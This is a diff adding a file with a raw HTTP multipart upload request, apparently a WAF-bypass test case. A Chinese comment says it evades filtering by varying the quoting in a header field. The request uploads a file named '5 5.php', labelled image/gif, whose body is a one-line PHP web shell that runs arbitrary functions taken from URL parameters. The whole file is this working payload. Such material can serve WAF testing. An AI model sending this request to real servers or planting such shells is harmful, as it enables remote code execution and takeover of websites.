@@ -1,0 +1,20 @@
+# upload_bypass_畸形表单15
+# 在头部字段的值添加单引号、双引号或者不加引号的方式进行绕过
+POST /?bid=hd_tag_m8mv23tf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23tf
+RM-PRO-Token: 153549c0a4ac9cf6736c48727c2c735f
+RM-PRO-Time: 1742808343416
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=aabbxxyy
+
+--aabbxxyy
+Content-Disposition: form-data; name=upload_file; filename="5 5.php
+Content-Type: image/gif
+
+<?php $_GET[a]($_GET[b]);?>
+--aabbxxyy
+Content-Disposition: form-data; name="submit"
+
+上传
+--aabbxxyy--
